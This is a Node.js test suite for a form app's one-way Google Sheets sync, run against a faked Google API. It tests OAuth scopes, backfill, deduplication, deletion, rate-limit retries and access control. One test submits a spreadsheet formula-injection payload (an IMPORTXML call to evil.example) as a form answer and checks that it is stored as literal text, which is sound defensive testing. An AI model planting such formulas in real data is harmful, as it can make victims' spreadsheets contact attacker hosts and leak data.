// One-way Google Sheets sync for Forms, against an HTTP-level fake of the Google token, Drive and Sheets APIs.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { runSheetsSync, syncDueSheets } from '../src/forms/google-sheets.mjs';
import { setup, signUp } from './helpers.mjs';

const json = (value, status = 200, headers = {}) => new Response(JSON.stringify(value), { status, headers: { 'Content-Type': 'application/json', ...headers } });
const SCOPE = 'openid email https://www.googleapis.com/auth/drive.file';
const config = { googleSheets: { enabled: true, clientId: 'sheets-client', clientSecret: 'sheets-secret' }, google: { clientId: 'gid', clientSecret: 'gsecret' } };

// A spreadsheet store with Google's A1 range semantics for the calls Schedora makes.
function fakeGoogle(env) {
  const state = { sheets: new Map(), calls: [], granted: SCOPE, refreshFails: false, failNext: null, files: [] };
  const tab = (spreadsheetId, title) => state.sheets.get(spreadsheetId)?.tabs.get(title);
  env.app.fetchProvider = async (url, init = {}) => {
    const method = init.method || 'GET';
    state.calls.push({ url, method, body: init.body ? String(init.body) : '' });
    if (url === 'https://oauth2.googleapis.com/token') {
      const form = new URLSearchParams(String(init.body));
      if (form.get('grant_type') === 'refresh_token' && state.refreshFails) return json({ error: 'invalid_grant' }, 400);
      return json({ access_token: 'ya29.sheets', refresh_token: 'refresh-sheets', expires_in: 3600, scope: state.granted });
    }
    if (url === 'https://oauth2.googleapis.com/revoke') return json({});
    if (url.startsWith('https://openidconnect.googleapis.com/v1/userinfo')) return json({ email: 'owner@gmail.com' });
    if (state.failNext) { const failure = state.failNext; state.failNext = null; return failure(); }
    if (url.startsWith('https://www.googleapis.com/drive/v3/files')) return json({ files: state.files });
    const parsed = new URL(url);
    if (parsed.pathname === '/v4/spreadsheets' && method === 'POST') {
      const body = JSON.parse(init.body);
      const id = 'sheet' + 'x'.repeat(20) + state.sheets.size;
      const title = body.sheets[0].properties.title;
      state.sheets.set(id, { title: body.properties.title, tabs: new Map([[title, { sheetId: 0, rows: [] }]]) });
      return json({ spreadsheetId: id, spreadsheetUrl: `https://docs.google.com/spreadsheets/d/${id}/edit`, properties: body.properties, sheets: [{ properties: { sheetId: 0, title } }] });
    }
    const match = /^\/v4\/spreadsheets\/([^/:]+)(.*)$/.exec(decodeURIComponent(parsed.pathname));
    const book = match && state.sheets.get(match[1]);
    if (!book) return json({ error: { message: 'Requested entity was not found.' } }, 404);
    const rest = match[2];
    if (rest === '' && method === 'GET') return json({ spreadsheetId: match[1], spreadsheetUrl: `https://docs.google.com/spreadsheets/d/${match[1]}/edit`, properties: { title: book.title }, sheets: [...book.tabs].map(([title, item]) => ({ properties: { title, sheetId: item.sheetId } })) });
    if (rest === ':batchUpdate') {
      const title = JSON.parse(init.body).requests[0].addSheet.properties.title;
      book.tabs.set(title, { sheetId: book.tabs.size + 10, rows: [] });
      return json({ replies: [{ addSheet: { properties: { title, sheetId: book.tabs.size + 9 } } }] });
    }
    const ref = a1 => { const [, name, col, row] = /^'((?:[^']|'')+)'!([A-Z]+)(\d*)/.exec(a1); return { name: name.replace(/''/g, "'"), row: row ? Number(row) : null }; };
    if (rest.startsWith('/values/') && rest.endsWith(':append')) {
      const body = JSON.parse(init.body);
      assert.equal(parsed.searchParams.get('valueInputOption'), 'RAW');
      const target = tab(match[1], ref(rest.slice(8, -7)).name);
      target.rows.push(...body.values);
      return json({ updates: { updatedRows: body.values.length } });
    }
    if (rest === '/values:batchUpdate') {
      const body = JSON.parse(init.body);
      assert.equal(body.valueInputOption, 'RAW');
      for (const item of body.data) { const at = ref(item.range); const target = tab(match[1], at.name); while (target.rows.length < at.row) target.rows.push([]); target.rows[at.row - 1] = item.values[0]; }
      return json({ totalUpdatedRows: body.data.length });
    }
    if (rest.startsWith('/values/') && method === 'GET') {
      const target = tab(match[1], ref(rest.slice(8)).name);
      if (!target) return json({ error: { message: 'Unable to parse range' } }, 400);
      return json({ values: [target.rows.map(row => row[0] ?? '')] });
    }
    return json({ error: { message: 'unexpected ' + url } }, 500);
  };
  return state;
}

async function sessionCookie(env, http) {
  const email = (await http.get('/api/me')).body.user.email;
  const response = await fetch(env.base + '/api/auth/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password: 'a sufficiently long password' }) });
  return response.headers.get('set-cookie').split(';')[0];
}

async function fixture() {
  const env = await setup({ config });
  const google = fakeGoogle(env);
  const owner = env.client();
  const { ws } = await signUp(owner, 'Sheets owner');
  const forms = `/api/workspaces/${ws.id}/forms`;
  const created = (await owner.post(forms, { definition: { title: "Parents' enquiry", presentation: 'classic', fields: [{ id: 'name', type: 'short_text', label: 'Name', required: true }, { id: 'note', type: 'long_text', label: 'Note' }] } })).body;
  assert.equal((await owner.post(`${forms}/${created.id}/publish`)).status, 200);
  const path = `${forms}/${created.id}`;
  const connect = async () => {
    const start = (await owner.post(path + '/google-sheets/connect')).body;
    const state = new URL(start.url).searchParams.get('state');
    return fetch(`${env.base}/api/oauth/google_sheets/callback?code=sheets-code&state=${encodeURIComponent(state)}`, { headers: { Cookie: await sessionCookie(env, owner) }, redirect: 'manual' });
  };
  const respond = (answers, id) => env.client().post('/api/public/forms/' + created.slug + '/responses', { answers, submission_id: id });
  const book = () => [...google.sheets.values()][0];
  const rows = () => [...book().tabs.values()].at(-1).rows;
  return { ...env, google, owner, ws, path, created, connect, respond, rows, book };
}

test('the Sheets connection is separate, asks only for drive.file and never merges calendar scopes', async () => {
  const env = await fixture();
  try {
    assert.equal((await env.owner.get(`/api/workspaces/${env.ws.id}/integrations/google_sheets/start`)).status, 404, 'not startable from the calendar flow');
    const start = new URL((await env.owner.post(env.path + '/google-sheets/connect')).body.url);
    assert.equal(start.searchParams.get('scope'), SCOPE);
    assert.equal(start.searchParams.get('include_granted_scopes'), 'false');
    assert.equal(start.searchParams.get('client_id'), 'sheets-client');
    // A consent that left out the Sheets permission connects nothing.
    env.google.granted = 'openid email';
    const denied = await env.connect();
    assert.match(denied.headers.get('location'), /\/forms\/[0-9a-f-]{36}\/responses\?sheets=not_connected&message=Google%20did%20not%20grant/);
    assert.equal(env.app.db.get("SELECT COUNT(*) AS n FROM integrations WHERE provider = 'google_sheets'").n, 0);
    env.google.granted = SCOPE;
    const done = await env.connect();
    assert.equal(done.headers.get('location'), `${env.path.replace(/^\/api\/workspaces\/[^/]+/, '')}/responses?sheets=connected`);
    assert.equal(env.app.db.get("SELECT COUNT(*) AS n FROM integrations WHERE provider = 'google'").n, 0, 'no calendar connection is created');
    const status = (await env.owner.get(env.path + '/google-sheets')).body;
    assert.equal(status.available, true);
    assert.equal(status.connection.account, 'owner@gmail.com');
    assert.equal(status.sync, null);
  } finally { await env.close(); }
});

test('backfill, updates, deletions and retries keep one row per response with RAW (never evaluated) values', async () => {
  const env = await fixture();
  try {
    await env.respond({ name: 'Asha', note: '=IMPORTXML("https://evil.example","//a")' }, 'sheets-sync-000001');
    await env.respond({ name: 'Ravi' }, 'sheets-sync-000002');
    assert.equal((await env.owner.post(env.path + '/google-sheets', { destination: 'new' })).status, 409, 'connect first');
    await env.connect();
    const created = await env.owner.post(env.path + '/google-sheets', { destination: 'new' });
    assert.equal(created.status, 201, JSON.stringify(created.body));
    assert.equal(created.body.status, 'backfilling');
    assert.equal((await env.owner.post(env.path + '/google-sheets', { destination: 'new' })).status, 409, 'one destination per form');
    await syncDueSheets(env.app);
    let rows = env.rows();
    assert.equal(rows[0][0], 'Schedora response ID');
    assert.equal(rows.length, 3);
    assert.equal(rows.find(row => row.includes('Asha')).includes('=IMPORTXML("https://evil.example","//a")'), true, 'kept as literal text');
    const status = (await env.owner.get(env.path + '/google-sheets')).body.sync;
    assert.equal(status.status, 'active');
    assert.equal(status.synced_rows, 2);

    // Nothing changed: no Google calls beyond the cheap local check.
    const calls = env.google.calls.length;
    env.clock.now += 61000;
    await syncDueSheets(env.app);
    assert.equal(env.google.calls.length, calls);

    // An append that reached Google but whose result was lost is found by ID, not appended again.
    await env.respond({ name: 'Meera' }, 'sheets-sync-000003');
    const sync = env.app.db.get('SELECT * FROM form_google_syncs');
    const meera = env.app.db.get("SELECT id FROM responses WHERE answers LIKE '%Meera%'").id;
    env.rows().push([meera, 'stale copy']);
    env.clock.now += 61000;
    await runSheetsSync(env.app, sync.id);
    rows = env.rows();
    assert.equal(rows.filter(row => row[0] === meera).length, 1);
    assert.equal(rows.find(row => row[0] === meera).includes('Meera'), true);

    // Deleting a response (or retention) blanks its row and keeps the ID for reference.
    const ravi = env.app.db.get("SELECT id FROM responses WHERE answers LIKE '%Ravi%'").id;
    assert.equal((await env.owner.del(`${env.path}/responses/${ravi}`)).status, 204);
    env.clock.now += 61000;
    await syncDueSheets(env.app);
    const blanked = env.rows().find(row => row[0] === ravi);
    assert.equal(blanked[1], 'Deleted in Schedora');
    assert.ok(!blanked.includes('Ravi'));
    assert.equal(env.rows().length, 4);

    // Rate limits back off and honour Retry-After; the next pass completes.
    await env.respond({ name: 'Kiran' }, 'sheets-sync-000004');
    env.clock.now += 61000;
    env.google.failNext = () => json({ error: { message: 'Quota exceeded' } }, 429, { 'Retry-After': '120' });
    await syncDueSheets(env.app);
    let row = env.app.db.get('SELECT * FROM form_google_syncs');
    assert.equal(row.status, 'active');
    assert.ok(row.next_attempt_at >= env.clock.now + 120000);
    assert.match(row.last_error, /rate limit/);
    env.clock.now = row.next_attempt_at;
    await syncDueSheets(env.app);
    assert.equal(env.rows().filter(item => item.includes('Kiran')).length, 1);
    row = env.app.db.get('SELECT * FROM form_google_syncs');
    assert.equal(row.last_error, null);
  } finally { await env.close(); }
});

test('expired access asks to reconnect, reconnecting resumes, and disconnecting or leaving stops the sync', async () => {
  const env = await fixture();
  try {
    await env.respond({ name: 'Asha' }, 'sheets-auth-0000001');
    await env.connect();
    await env.owner.post(env.path + '/google-sheets', { destination: 'new' });
    await syncDueSheets(env.app);
    // The access token expires and Google refuses the refresh.
    env.clock.now += 2 * 3600000;
    env.google.refreshFails = true;
    await env.respond({ name: 'Ravi' }, 'sheets-auth-0000002');
    await syncDueSheets(env.app);
    assert.equal(env.app.db.get('SELECT status FROM form_google_syncs').status, 'reconnect_required');
    assert.equal((await env.owner.post(env.path + '/google-sheets/retry')).status, 409);
    env.google.refreshFails = false;
    await env.connect();
    assert.equal(env.app.db.get('SELECT status FROM form_google_syncs').status, 'active');
    await syncDueSheets(env.app);
    assert.equal(env.rows().filter(row => row.includes('Ravi')).length, 1);

    // Disconnecting revokes the token at Google and stops writing; the rows stay in Google.
    assert.equal((await env.owner.del(`/api/workspaces/${env.ws.id}/google-sheets/connection`)).status, 204);
    assert.ok(env.google.calls.some(call => call.url === 'https://oauth2.googleapis.com/revoke'));
    const after = (await env.owner.get(env.path + '/google-sheets')).body;
    assert.equal(after.connection, null);
    assert.equal(after.sync.status, 'disconnected');
    assert.equal(env.rows().length, 3);
  } finally { await env.close(); }
});

test('destinations are limited to files this connection can open, another workspace cannot touch the sync, and a missing spreadsheet stops with a reason', async () => {
  const env = await fixture();
  try {
    await env.connect();
    await env.owner.post(env.path + '/google-sheets', { destination: 'new' });
    const [spreadsheetId] = env.google.sheets.keys();
    env.google.files = [{ id: spreadsheetId, name: 'Existing book', modifiedTime: '2026-10-24T05:00:00Z' }];
    const listed = (await env.owner.get(`/api/workspaces/${env.ws.id}/google-sheets/destinations`)).body.spreadsheets;
    assert.deepEqual(listed.map(item => item.title), ['Existing book']);
    assert.ok(env.google.calls.find(call => call.url.startsWith('https://www.googleapis.com/drive/v3/files')).url.includes('trashed%3Dfalse'));

    // Another workspace's member gets 404 for this form's sync.
    const other = env.client();
    const { ws: otherWs } = await signUp(other, 'Other workspace');
    const foreign = env.path.replace(/workspaces\/[^/]+/, 'workspaces/' + otherWs.id);
    assert.equal((await other.get(foreign + '/google-sheets')).status, 404);
    assert.equal((await other.del(env.path + '/google-sheets')).status, 404);

    // Choosing an existing spreadsheet adds a new tab rather than writing over an existing one.
    await env.owner.del(env.path + '/google-sheets');
    const reused = await env.owner.post(env.path + '/google-sheets', { spreadsheet_id: spreadsheetId });
    assert.equal(reused.status, 201, JSON.stringify(reused.body));
    assert.equal(env.book().tabs.size, 2);
    assert.notEqual(reused.body.tab, [...env.book().tabs.keys()][0]);

    env.google.sheets.clear();
    await env.respond({ name: 'Asha' }, 'sheets-gone-0000001');
    await syncDueSheets(env.app);
    const sync = (await env.owner.get(env.path + '/google-sheets')).body.sync;
    assert.equal(sync.status, 'error');
    assert.match(sync.last_error, /deleted, or this connection can no longer open it/);
  } finally { await env.close(); }
});

test('Google Sheets sync stays unavailable until the server enables it', async () => {
  const env = await setup();
  try {
    const owner = env.client();
    const { ws } = await signUp(owner, 'No sheets');
    const form = (await owner.post(`/api/workspaces/${ws.id}/forms`, { title: 'Plain' })).body;
    const status = (await owner.get(`/api/workspaces/${ws.id}/forms/${form.id}/google-sheets`)).body;
    assert.equal(status.available, false);
    assert.equal((await owner.post(`/api/workspaces/${ws.id}/forms/${form.id}/google-sheets/connect`)).status, 501);
  } finally { await env.close(); }
});
